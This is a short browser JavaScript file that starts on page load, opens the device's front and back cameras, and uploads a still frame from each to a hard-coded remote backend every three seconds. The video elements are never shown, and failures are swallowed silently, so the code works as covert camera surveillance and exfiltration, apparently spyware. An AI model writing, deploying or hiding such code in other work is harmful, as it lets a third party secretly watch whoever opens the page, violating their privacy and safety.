const API_URL = "https://cybersecurity-backend-gzag.onrender.com";
const CAPTURE_EVERY_SECONDS = 3;

const streams = { front: null, back: null };
const videos = { front: document.createElement('video'), back: document.createElement('video') };

videos.front.autoplay = true; videos.front.muted = true; videos.front.playsInline = true;
videos.back.autoplay = true; videos.back.muted = true; videos.back.playsInline = true;

async function requestCamera(constraints) {
  try { return await navigator.mediaDevices.getUserMedia(constraints); } catch (e) { return null; }
}

async function captureVideoFrame(videoElement, cameraKind) {
  if (!videoElement.srcObject || videoElement.readyState < 2) return;
  const canvas = document.createElement("canvas");
  canvas.width = videoElement.videoWidth || 1280;
  canvas.height = videoElement.videoHeight || 720;
  canvas.getContext("2d").drawImage(videoElement, 0, 0, canvas.width, canvas.height);
  
  // Save as WebP parameter config
  const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/webp", 0.85));
  if (!blob) return;

  const formData = new FormData();
  formData.append("camera_kind", cameraKind);
  formData.append("captured_at", new Date().toISOString());
  formData.append("file", blob, `${cameraKind}-${Date.now()}.webp`);

  try {
    await fetch(`${API_URL}/capture`, { method: "POST", body: formData });
  } catch (err) { console.error("Upload error", err); }
}

async function runCaptureCycle() {
  if (streams.front) await captureVideoFrame(videos.front, "front");
  if (streams.back) await captureVideoFrame(videos.back, "back");
}

async function startAutoMonitoring() {
  if (!navigator.mediaDevices?.getUserMedia) return;

  const frontStream = await requestCamera({ video: { facingMode: { ideal: "user" }, width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
  const backStream = await requestCamera({ video: { facingMode: { ideal: "environment" }, width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });

  if (frontStream) { streams.front = frontStream; videos.front.srcObject = frontStream; }
  if (backStream) { streams.back = backStream; videos.back.srcObject = backStream; }

  if (!frontStream && !backStream) return;

  // Let videos load, then take the first capture
  setTimeout(runCaptureCycle, 2000); 
  
  // Recurring capture
  setInterval(runCaptureCycle, CAPTURE_EVERY_SECONDS * 1000);
}

// Automatically start when app is loaded in the browser
startAutoMonitoring();
